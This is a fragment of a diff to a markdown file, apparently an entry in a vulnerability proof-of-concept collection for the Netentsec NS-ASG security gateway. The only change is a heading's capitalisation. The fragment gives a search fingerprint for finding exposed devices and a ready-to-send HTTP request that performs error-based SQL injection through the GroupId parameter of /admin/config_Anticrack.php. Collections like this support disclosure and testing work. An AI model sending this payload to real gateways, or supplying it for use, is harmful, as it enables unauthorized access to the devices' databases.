@@ -5,7 +5,7 @@
 app="网康科技-NS-ASG安全网关
 ```
 
-## poc
+## POC
 ```
 GET /admin/config_Anticrack.php?GroupId=1+UNION+ALL+SELECT+EXTRACTVALUE(1,concat(0x7e,(select+version()),0x7e)) HTTP/1.1
 Host: 
